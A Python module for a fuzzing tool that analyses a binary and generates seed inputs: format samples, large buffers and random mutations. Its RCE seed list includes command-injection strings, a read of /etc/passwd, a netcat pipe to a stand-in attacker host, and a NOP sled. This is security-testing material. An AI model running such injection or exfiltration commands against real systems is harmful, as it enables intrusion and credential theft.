#!/usr/bin/env python3
"""
Autonomous Corpus Generator - Intelligent Seed Generation

Instead of hardcoded seeds, this module:
- Analyzes the binary to detect expected input formats
- Generates goal-directed seeds
- Creates format-specific test cases (XML, JSON, protocol messages)
- Learns which seed patterns lead to coverage/crashes
"""

import json
import subprocess
from pathlib import Path
from typing import List, Dict, Optional, Set

from core.logging import get_logger

logger = get_logger()


class CorpusGenerator:
    """
    Autonomous corpus generator that creates intelligent seeds.

    Instead of static seeds, this analyzes the binary and goals
    to generate targeted test cases.
    """

    def __init__(self, binary_path: Path, memory=None, goal=None):
        """
        Initialize corpus generator.

        Args:
            binary_path: Path to binary to analyze
            memory: FuzzingMemory for learning (optional)
            goal: Goal object for goal-directed generation (optional)
        """
        self.binary_path = Path(binary_path)
        self.memory = memory
        self.goal = goal
        self.binary_strings: Set[str] = set()
        self.detected_formats: Set[str] = set()
        self.detected_commands: Dict[str, str] = {}  # Command -> description mapping

        logger.info("Autonomous corpus generator initialized")

    def analyze_binary(self) -> Dict[str, any]:
        """
        Analyze binary to detect expected input formats.

        Returns:
            Dictionary with analysis results
        """
        logger.info("Analyzing binary for corpus generation hints...")

        analysis = {
            "formats_detected": [],
            "keywords_found": [],
            "file_extensions": [],
            "protocols": [],
        }

        try:
            # Extract strings from binary
            result = subprocess.run(
                ["strings", str(self.binary_path)],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                strings = result.stdout.lower().split('\n')
                self.binary_strings = set(s.strip() for s in strings if len(s.strip()) > 3)

                # Detect formats
                format_indicators = {
                    "xml": ["<xml", "<?xml", "</", "xmlns", "dtd"],
                    "json": ['":', '{"', '"[', "json"],
                    "yaml": ["yaml", "---", "key:", "list:"],
                    "http": ["http/", "get ", "post ", "content-type"],
                    "protocol_buffer": ["protobuf", "proto", ".proto"],
                    "csv": [".csv", "comma", "delimiter"],
                    "ini": [".ini", "[section]", "key=value"],
                }

                for format_name, indicators in format_indicators.items():
                    if any(ind in ' '.join(self.binary_strings) for ind in indicators):
                        analysis["formats_detected"].append(format_name)
                        self.detected_formats.add(format_name)
                        logger.info(f"Detected format: {format_name}")

                # Detect file extensions
                extensions = [".txt", ".xml", ".json", ".conf", ".cfg", ".dat", ".bin"]
                for ext in extensions:
                    if ext in ' '.join(self.binary_strings):
                        analysis["file_extensions"].append(ext)

                # Detect keywords that suggest input processing
                keywords = ["parse", "read", "load", "process", "decode", "input", "file"]
                for keyword in keywords:
                    if keyword in ' '.join(self.binary_strings):
                        analysis["keywords_found"].append(keyword)

                # Detect command-based input format (e.g., "STACK:", "HEAP:")
                command_patterns = {
                    "STACK": ["[stack]", "stack:", "vuln_stack"],
                    "HEAP": ["[heap]", "heap:", "vuln_heap"],
                    "UAF": ["[uaf]", "uaf:", "use-after-free", "use_after_free"],
                    "JSON": ["[json]", "json:", "vuln_json", "parse_json"],
                    "XML": ["[xml]", "xml:", "vuln_xml", "parse_xml"],
                    "FMT": ["[fmt]", "fmt:", "format string", "vuln_format"],
                    "INT": ["[int]", "int:", "integer overflow", "vuln_integer"],
                    "NULL": ["[null]", "null:", "null pointer", "vuln_null"],
                }

                for cmd, patterns in command_patterns.items():
                    if any(pat in ' '.join(self.binary_strings) for pat in patterns):
                        self.detected_commands[cmd] = f"command_{cmd.lower()}"
                        logger.info(f"Detected command: {cmd}")

                if self.detected_commands:
                    analysis["commands_detected"] = list(self.detected_commands.keys())

                logger.info(f"Binary analysis complete: {len(analysis['formats_detected'])} formats, {len(self.detected_commands)} commands detected")

        except Exception as e:
            logger.warning(f"Binary analysis failed: {e}")

        return analysis

    def _wrap_with_commands(self, seeds: List[bytes]) -> List[bytes]:
        """
        Wrap seeds with detected command prefixes.

        Args:
            seeds: List of raw seeds

        Returns:
            List of wrapped seeds (or original if no commands detected)
        """
        if not self.detected_commands:
            return seeds

        wrapped_seeds = []

        # For each seed, create versions with each detected command
        for seed in seeds:
            for cmd in self.detected_commands.keys():
                # Format: COMMAND:DATA
                wrapped = f"{cmd}:".encode() + seed
                wrapped_seeds.append(wrapped)

        return wrapped_seeds

    def generate_autonomous_corpus(self, corpus_dir: Path, max_seeds: int = 20) -> int:
        """
        Generate intelligent seed corpus based on analysis and goals.

        Args:
            corpus_dir: Directory to store seeds
            max_seeds: Maximum number of seeds to generate

        Returns:
            Number of seeds generated
        """
        logger.info("=" * 70)
        logger.info("AUTONOMOUS CORPUS GENERATION")
        logger.info("=" * 70)

        corpus_dir.mkdir(parents=True, exist_ok=True)
        seeds_generated = 0

        # Analyze binary first
        analysis = self.analyze_binary()

        # 1. Generate basic seeds (always useful)
        logger.info("Generating basic seed corpus...")
        basic_seeds = self._generate_basic_seeds()

        # Wrap with commands if detected
        if self.detected_commands:
            logger.info(f"Wrapping basic seeds with {len(self.detected_commands)} detected commands")
            basic_seeds = self._wrap_with_commands(basic_seeds)

        for i, seed in enumerate(basic_seeds):
            seed_file = corpus_dir / f"seed_basic_{i:03d}"
            seed_file.write_bytes(seed)
            seeds_generated += 1
        logger.info(f"Generated {len(basic_seeds)} basic seeds")

        # 2. Generate format-specific seeds
        if self.detected_formats:
            logger.info(f"Generating format-specific seeds for: {', '.join(self.detected_formats)}")
            for format_name in self.detected_formats:
                format_seeds = self._generate_format_seeds(format_name)
                for i, seed in enumerate(format_seeds[:5]):  # Max 5 per format
                    seed_file = corpus_dir / f"seed_{format_name}_{i:03d}"
                    seed_file.write_bytes(seed)
                    seeds_generated += 1
            logger.info(f"Generated {seeds_generated - len(basic_seeds)} format-specific seeds")

        # 3. Generate goal-directed seeds
        if self.goal:
            logger.info(f"Generating goal-directed seeds for: {self.goal.description}")
            goal_seeds = self._generate_goal_directed_seeds()

            # Wrap with appropriate command based on goal
            if self.detected_commands and goal_seeds:
                goal_desc = self.goal.description.lower()
                # Try to match goal to specific command
                matched_cmd = None
                if "stack" in goal_desc and "STACK" in self.detected_commands:
                    matched_cmd = "STACK"
                elif "heap" in goal_desc and "HEAP" in self.detected_commands:
                    matched_cmd = "HEAP"
                elif "uaf" in goal_desc or "use-after-free" in goal_desc:
                    if "UAF" in self.detected_commands:
                        matched_cmd = "UAF"

                if matched_cmd:
                    logger.info(f"Wrapping goal-directed seeds with {matched_cmd} command")
                    goal_seeds = [f"{matched_cmd}:".encode() + seed for seed in goal_seeds]
                else:
                    # Wrap with all commands if no specific match
                    goal_seeds = self._wrap_with_commands(goal_seeds)

            for i, seed in enumerate(goal_seeds):
                seed_file = corpus_dir / f"seed_goal_{i:03d}"
                seed_file.write_bytes(seed)
                seeds_generated += 1
            logger.info(f"Generated {len(goal_seeds)} goal-directed seeds")

        # 4. Load successful seeds from memory
        if self.memory:
            logger.info("Checking memory for successful seed patterns...")
            # In future: retrieve seeds that led to crashes in past campaigns
            # For now: placeholder

        logger.info(f"✓ Autonomous corpus generation complete: {seeds_generated} seeds")
        return seeds_generated

    def _generate_basic_seeds(self) -> List[bytes]:
        """Generate basic seed corpus that works for most binaries."""
        return [
            b"",                          # Empty input
            b"A",                         # Single byte
            b"A" * 10,                    # Small buffer
            b"A" * 100,                   # Medium buffer
            b"A" * 1000,                  # Large buffer
            b"\x00",                      # Null byte
            b"\x00" * 100,                # Null buffer
            b"\xff" * 100,                # High bytes
            b"hello\n",                   # Simple text
            b"test input\n",              # Text with newline
            b"\n" * 100,                  # Many newlines
            b"!@#$%^&*()",                # Special chars
        ]

    def _generate_format_seeds(self, format_name: str) -> List[bytes]:
        """Generate seeds for specific formats."""

        if format_name == "xml":
            return [
                b'<?xml version="1.0"?>',
                b'<?xml version="1.0"?><root></root>',
                b'<?xml version="1.0"?><root><item>test</item></root>',
                b'<?xml version="1.0"?><root attr="value">data</root>',
                b'<?xml version="1.0"?><root>' + b'A' * 1000 + b'</root>',  # Long content
                b'<root><nested><deep>value</deep></nested></root>',  # Nested
                b'<!DOCTYPE root><root></root>',  # With DOCTYPE
                b'<?xml version="1.0"?><root><![CDATA[data]]></root>',  # CDATA
            ]

        elif format_name == "json":
            return [
                b'{}',
                b'{"key": "value"}',
                b'{"string": "test", "number": 123, "bool": true}',
                b'{"nested": {"key": "value"}}',
                b'[]',
                b'[1, 2, 3]',
                b'[{"id": 1}, {"id": 2}]',
                b'{"array": [1, 2, 3], "object": {"k": "v"}}',
                b'{"long": "' + b'A' * 1000 + b'"}',  # Long string
                b'{"unicode": "\\u0000\\u0001\\u0002"}',  # Unicode escapes
            ]

        elif format_name == "yaml":
            return [
                b'key: value',
                b'---\nkey: value\nlist:\n  - item1\n  - item2',
                b'config:\n  option1: true\n  option2: 123',
                b'nested:\n  level1:\n    level2: value',
            ]

        elif format_name == "http":
            return [
                b'GET / HTTP/1.1\r\nHost: localhost\r\n\r\n',
                b'POST / HTTP/1.1\r\nContent-Length: 5\r\n\r\nhello',
                b'GET /path HTTP/1.1\r\nUser-Agent: test\r\n\r\n',
                b'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n',
            ]

        elif format_name == "csv":
            return [
                b'col1,col2,col3',
                b'val1,val2,val3\nval4,val5,val6',
                b'"quoted","values","here"',
                b'a,b,c\n1,2,3\n4,5,6',
            ]

        elif format_name == "ini":
            return [
                b'[section]\nkey=value',
                b'[global]\noption1=true\noption2=123\n\n[local]\npath=/tmp',
            ]

        # Generic structured data
        return [
            b'{' + b'A' * 100 + b'}',  # Malformed brackets
            b'[' + b'A' * 100 + b']',  # Malformed arrays
        ]

    def _generate_goal_directed_seeds(self) -> List[bytes]:
        """Generate seeds based on current goal."""
        if not self.goal:
            return []

        goal_desc = self.goal.description.lower()
        seeds = []

        # Goal: Find stack overflow
        if "stack" in goal_desc and "overflow" in goal_desc:
            logger.info("Goal: Generating stack overflow test cases")
            seeds.extend([
                b"A" * 64,                      # Exact size
                b"A" * 100,                     # Medium overflow
                b"A" * 256,                     # Large overflow
                b"A" * 1024,                    # Very large
                b"\x00" * 50 + b"A" * 50,      # Mixed with nulls
            ])

        # Goal: Find heap overflow
        if "heap" in goal_desc and "overflow" in goal_desc:
            logger.info("Goal: Generating heap overflow test cases")
            seeds.extend([
                b"A" * 1024,                    # 1KB
                b"A" * 4096,                    # 4KB
                b"A" * 65536,                   # 64KB
                b"\x00" * 1024 + b"A" * 1024,  # Mixed
            ])

        # Goal: Find buffer overflow
        if "buffer" in goal_desc and "overflow" in goal_desc:
            logger.info("Goal: Generating buffer overflow test cases")
            seeds.extend([
                b"A" * 256,
                b"A" * 512,
                b"A" * 1024,
                b"%s" * 100,  # Format string
                b"%n" * 100,
            ])

        # Goal: Target parser
        if "parser" in goal_desc or "parse" in goal_desc:
            logger.info("Goal: Generating parser-targeted test cases")
            # Generate malformed structured data
            seeds.extend([
                b'{"key": "value"',           # Unclosed JSON
                b'<root><unclosed>',          # Unclosed XML
                b'{"deeply": {"nested": {' * 100 + b'}' * 50,  # Deep nesting
                b'<tag>' * 1000,              # Many tags
            ])

        # Goal: Find use-after-free
        if "use-after-free" in goal_desc or "uaf" in goal_desc:
            logger.info("Goal: Generating UAF test cases")
            seeds.extend([
                b"alloc\nfree\nuse",
                b"A" * 100 + b"\x00" + b"B" * 100,  # Trigger realloc
            ])

        # Goal: RCE / code execution
        if "rce" in goal_desc or "code execution" in goal_desc:
            logger.info("Goal: Generating RCE test cases")
            seeds.extend([
                b"$(whoami)",
                b"`id`",
                b"; cat /etc/passwd",
                b"| nc attacker.com 4444",
                b"\x90" * 100 + b"\xcc",  # NOP sled + int3
            ])

        return seeds

    def optimize_corpus(self, corpus_dir: Path, coverage_data: Optional[Dict] = None) -> int:
        """
        Optimize corpus by removing redundant seeds.

        Args:
            corpus_dir: Corpus directory
            coverage_data: Coverage info for each seed (optional)

        Returns:
            Number of seeds removed
        """
        logger.info("Optimizing corpus (removing redundant seeds)...")

        seeds = list(corpus_dir.glob("seed_*"))
        initial_count = len(seeds)

        if not coverage_data:
            # Simple deduplication by content
            seen_hashes = set()
            removed = 0

            for seed_file in seeds:
                content = seed_file.read_bytes()
                content_hash = hash(content)

                if content_hash in seen_hashes:
                    seed_file.unlink()
                    removed += 1
                else:
                    seen_hashes.add(content_hash)

            logger.info(f"Removed {removed} duplicate seeds")
            return removed

        # With coverage data, remove seeds that don't add new coverage
        # TODO: Implement coverage-guided minimization
        return 0

    def learn_from_crash(self, crash_input: Path, crash_type: str):
        """
        Learn from a crash to improve future corpus generation.

        Args:
            crash_input: Input that caused crash
            crash_type: Type of crash
        """
        if not self.memory:
            return

        logger.info(f"Learning from {crash_type} crash: {crash_input.name}")

        # Extract patterns from crashing input
        try:
            content = crash_input.read_bytes()

            # Record characteristics
            knowledge = {
                "size": len(content),
                "has_nulls": b"\x00" in content,
                "has_high_bytes": any(b > 127 for b in content),
                "crash_type": crash_type,
            }

            # In future: use memory to store successful patterns
            logger.debug(f"Crash pattern: {knowledge}")

        except Exception as e:
            logger.warning(f"Failed to learn from crash: {e}")

    def generate_mutated_seed(self, base_seed: bytes, mutation_type: str = "havoc") -> bytes:
        """
        Generate a mutated version of a seed.

        Args:
            base_seed: Original seed
            mutation_type: Type of mutation

        Returns:
            Mutated seed
        """
        import random

        if mutation_type == "bit_flip":
            # Flip random bits
            seed = bytearray(base_seed)
            for _ in range(random.randint(1, 10)):
                if seed:
                    pos = random.randint(0, len(seed) - 1)
                    seed[pos] ^= (1 << random.randint(0, 7))
            return bytes(seed)

        elif mutation_type == "byte_insert":
            # Insert random bytes
            seed = bytearray(base_seed)
            pos = random.randint(0, len(seed))
            seed.insert(pos, random.randint(0, 255))
            return bytes(seed)

        elif mutation_type == "byte_delete":
            # Delete random byte
            if len(base_seed) > 0:
                seed = bytearray(base_seed)
                pos = random.randint(0, len(seed) - 1)
                del seed[pos]
                return bytes(seed)
            return base_seed

        elif mutation_type == "expand":
            # Expand the input
            return base_seed + (base_seed * random.randint(1, 10))

        else:  # havoc - combine multiple mutations
            seed = base_seed
            for _ in range(random.randint(1, 5)):
                mutation = random.choice(["bit_flip", "byte_insert", "byte_delete", "expand"])
                seed = self.generate_mutated_seed(seed, mutation)
            return seed
